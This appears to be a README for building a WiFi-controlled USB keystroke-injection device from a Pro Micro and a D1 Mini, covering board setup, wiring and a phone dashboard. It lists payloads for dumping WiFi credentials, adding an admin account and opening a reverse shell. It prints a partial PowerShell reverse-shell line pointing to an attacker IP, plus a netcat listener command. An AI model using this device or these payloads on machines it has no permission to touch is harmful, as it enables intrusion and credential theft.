# WebQuack Clone — Complete Build Guide

> [!WARNING]
> ## ⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️
> This project is created strictly for educational and research purposes. The author is **NOT** responsible for any misuse, damage, or illegal activities carried out with this tool. By using this software or hardware, you agree that you are doing so at your own risk. As this repository is public, I am not liable for how third parties choose to use, modify, or distribute this code.


## What You're Building

```
[Target PC] ──USB──> [Pro Micro] ──Serial──> [D1 Mini Pro] <──WiFi── [Your Phone]
                     (keyboard)               (web server)             (web UI)
```

---

## Parts List

| Part | Purpose |
|---|---|
| Arduino Pro Micro (5V/16MHz) | USB HID keyboard/mouse to target PC |
| Wemos D1 Mini Pro | WiFi hotspot + web server + C2 brain |
| Logic Level Shifter (3.3V↔5V) | Safely bridge TX/RX between boards |
| 4× jumper wires | Wiring |
| Optional: USB-A male breakout | Hide inside USB charger/cable |

---

## Step 1 — Install Arduino IDE & Board Packages

1. Download **Arduino IDE 2.x** from [arduino.cc](https://arduino.cc)
2. Open **File > Preferences**, add this URL to "Additional Boards Manager URLs":
   ```
   https://arduino.esp8266.com/stable/package_esp8266com_index.json
   ```
3. Go to **Tools > Board > Boards Manager**, search `esp8266`, install **ESP8266 by ESP8266 Community**
4. The Pro Micro uses **AVR** boards — already built in. No extra install needed.

---

## Step 2 — Install Required Libraries

Open **Tools > Manage Libraries**, install:

| Library | Author |
|---|---|
| `ESPAsyncWebServer` | Me-No-Dev |
| `ESPAsyncTCP` | Me-No-Dev |
| `LittleFS` (comes with ESP8266 core) | Built-in |

> **Note**: ESPAsyncWebServer may not appear in Library Manager. If so:  
> Download ZIP from: https://github.com/me-no-dev/ESPAsyncWebServer  
> Then **Sketch > Include Library > Add .ZIP Library**  
> Do the same for ESPAsyncTCP: https://github.com/me-no-dev/ESPAsyncTCP

---

## Step 3 — Install LittleFS Upload Tool (for web UI)

This uploads the `data/` folder (your web UI + payloads) to the D1 Mini's flash.

1. Go to: https://github.com/earlephilhower/arduino-littlefs-upload
2. Download the latest `.vsix` file
3. In Arduino IDE 2.x: **Sketch > Include Library > Add .ZIP Library**
4. OR install as a plugin via Arduino IDE's Plugin Manager
5. After install, you'll see **Tools > ESP8266 LittleFS Data Upload**

---

## Step 4 — Flash Pro Micro

1. Open `WebQuack/pro_micro/pro_micro.ino` in Arduino IDE
2. **Tools > Board > Arduino AVR Boards > Arduino Micro**
   - ⚠️ Select **"Arduino Micro"** not "Leonardo" — Pro Micro uses same chip
3. **Tools > Port** — select the COM port that appears when you plug in Pro Micro
4. Click **Upload** (→ arrow button)
5. You'll see `avrdude done. Thank you.` when done

> **Troubleshooting Double-Tap Reset**: If upload fails, double-tap the reset button on the Pro Micro right when you click Upload. This enters bootloader mode.

---

## Step 5 — Flash D1 Mini Pro (Sketch)

1. Open `WebQuack/d1_mini/d1_mini.ino`
2. **Tools > Board > ESP8266 Boards > LOLIN(WEMOS) D1 mini Pro**
3. **Tools > Upload Speed**: `115200`
4. **Tools > Flash Size**: `16M (FS:14M OTA:~1019KB)` ← important!
5. **Tools > Port** — select COM port for D1 Mini
6. Click **Upload**

---

## Step 6 — Upload Web UI to D1 Mini (LittleFS)

> ⚠️ **Do this AFTER Step 5, with D1 Mini still connected.**

1. In Arduino IDE with `d1_mini.ino` open
2. Click **Tools > ESP8266 LittleFS Data Upload**
3. It uploads everything inside `d1_mini/data/` to the D1 Mini's filesystem
4. Wait for `[LittleFS] Upload Success` message

---

## Step 7 — Wiring

**POWER: Plug EACH board into its OWN USB port. Do NOT share power rails.**

```
   D1 Mini Pro [right col]        Level Shifter    Pro Micro [left col]
   ───────────────────────        ─────────────    ────────────────────
   TX  (col 2, pin 1 top)  ─────► HV1 ─► LV1 ───► RXI (col 1, pin 2)
   RX  (col 2, pin 2)      ◄───── HV2 ◄─ LV2 ◄─── TXO (col 1, pin 1)
   GND (col 2, pin 7)      ─────────────────────── GND (col 1, pin 3)
   3V3 (col 1, pin 8 bot)  ─────── LV ref input
   [Pro Micro VCC]         ─────── HV ref input
```

| Wire | From (Pro Micro) | Level Shifter | To (D1 Mini Pro) | Notes |
|---|---|---|---|---|
| Power (HV Ref) | VCC (5V pin) | HV ref input | - | Reference voltage for Pro Micro |
| Power (LV Ref) | - | LV ref input | 3V3 (col 1, pin 8 bot) | Reference voltage for ESP8266 |
| Ground | GND (left col, pin 3) | GND | GND (col 2, pin 7) | Shared ground through shifter |
| Serial RX←TX | RXI (left col, pin 2) | LV1 ← HV1 | TX (col 2, pin 1 top) | D1 Mini 3.3V signals read by Pro Micro |
| Serial TX→RX | TXO (left col, pin 1) | HV2 → LV2 | RX (col 2, pin 2) | Pro Micro 5V stepped down to 3.3V |

> ⚠️ **WHY LEVEL SHIFTER:** Pro Micro TXO uses 5V logic. D1 Mini RX max limit is 3.3V. Providing 5V to the ESP's RX pin without a shifter can permanently damage it! Do not build this without a Logic Level Shifter.

---

## Step 8 — Test It

1. Wire boards together as above
2. **Plug Pro Micro USB into your test PC** (your own PC only!)
3. **Power D1 Mini via USB** (phone charger or second USB port)
4. On your phone → WiFi settings → connect to `WebQuack` (password: `hacker123`)
5. Open browser → `http://192.168.4.1`
6. You should see the hacker dashboard
7. Tap **KEYBOARD tab** → type something in Live Inject → tap **⚡ INJECT**
8. Watch it type on your PC! 🎉

---

## Project File Structure

```
WebQuack/
├── pro_micro/
│   └── pro_micro.ino          ← Flash to Arduino Pro Micro
└── d1_mini/
    ├── d1_mini.ino            ← Flash to D1 Mini Pro
    └── data/                  ← Upload via LittleFS tool
        ├── index.html         ← Web UI dashboard
        └── payloads/
            ├── wifi_dump.txt
            ├── reverse_shell.txt   ← Edit ATTACKER_IP first!
            ├── add_admin.txt
            └── lock_screen.txt
```

---

## Payload Customization

Edit `reverse_shell.txt` — replace `ATTACKER_IP` with your machine's IP:
```
KEY:$c=New-Object Net.Sockets.TCPClient('192.168.1.50',4444);...
```

On your machine, start the listener before running payload:
```bash
nc -lvnp 4444
```

---

## ⚖️ Legal & Disclaimer

- **Educational Use Only**: This tool is for learning about HID security and serial communication.
- **No Liability**: The author assumes no liability and is not responsible for any misuse or damage caused by this program.
- **Permission Required**: Use only on your own systems or systems you have **explicit written permission** to test. Unauthorized HID attacks are illegal under computer fraud laws.
- **Public Repository**: Since this code is public, the user takes full responsibility for its application.


---

## Troubleshooting

| Problem | Fix |
|---|---|
| Pro Micro not detected | Double-tap reset button, try "Arduino Micro" board selection |
| D1 Mini upload fails | Hold FLASH button while pressing RESET, then release RESET |
| Web UI not loading | Make sure LittleFS upload was done (Step 6) |
| Text not injecting | Check Serial wiring, verify level shifter orientation |
| WiFi AP not visible | Wait 10 seconds after D1 Mini powers on |
| Keystrokes skipping | Add `DELAY:50` between KEY commands in payload |
